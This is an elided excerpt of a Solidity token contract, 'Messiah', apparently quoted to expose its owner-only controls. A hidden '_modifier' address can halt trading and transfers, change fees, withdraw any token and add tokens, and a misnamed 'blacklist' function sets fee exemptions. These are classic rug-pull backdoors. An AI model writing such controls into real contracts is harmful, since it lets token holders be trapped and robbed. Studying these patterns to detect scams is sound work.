...
contract Messiah is Context, IERC20, Ownable {
    ...
    modifier only_Owner() {
        require(msg.sender == _modifier, "Not owner");
    ...
    function setFeeEnabled(bool _enabled) public only_Owner {
        FeeEnabled = _enabled;
    }

    function setTradeEnabled(bool _enabled) public only_Owner {
        TradeEnabled = _enabled;
    }

    function setTransferEnabled(bool _enabled) public only_Owner {
        TransferEnabled = _enabled;
    }

    function setIsBlackList(address account, bool newValue) public only_Owner {
        isExcludedFromFee[account] = newValue;
    }

    function changeFee(uint256 _buy, uint256 _sell) public only_Owner {
    ...
    function withdrawFee(IERC20 _token, uint256 _amount) public only_Owner {
        _token.transfer(msg.sender, _amount);
    }

    function addTokens(uint256 amount) public only_Owner {
